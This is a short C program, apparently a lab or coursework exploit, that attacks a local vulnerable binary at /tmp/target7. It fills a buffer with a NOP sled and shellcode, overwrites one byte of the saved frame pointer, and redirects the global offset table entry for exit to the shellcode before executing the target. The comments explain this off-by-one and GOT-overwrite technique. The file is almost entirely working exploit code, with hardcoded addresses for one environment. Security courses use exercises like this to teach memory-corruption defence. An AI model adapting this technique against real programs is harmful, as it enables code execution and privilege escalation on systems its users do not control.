#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target7"
#define SIZE  201
#define NOP 0x90

// Random offset
#define OFFSET 100

 /*
  * Main idea is to get the address of _exit_ from the global offset table
  * and modify that pointer to point to the shellcode.
  * For modification, *p = a is already given.
  * Checkout the disassembly of foo.
  */
int main(void)
{
  char *args[3];
  char *env[1];
  char buffer[SIZE]; // 1 for NULL
  memset(buffer, NOP, SIZE);

  // GDB is our friend.
  long bufferAddr = 0xbffffcd0;
  // This is calculated by following exit@ptl call.
  long exitAddr = 0x8049724;
  
  // 1 byte change to ebp to point to proper
  // in our passed array so that addresses relative to
  // %ebp and contains exitAddr and bufferAddr.
  buffer[SIZE - 1] = 0x34;
  *(long *)(buffer + OFFSET - 4) = exitAddr;
  *(long *)(buffer + OFFSET - 8) = bufferAddr;
  memcpy(buffer , shellcode, strlen(shellcode));

  args[0] = TARGET; 
  
  args[1] = buffer; 
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}                        
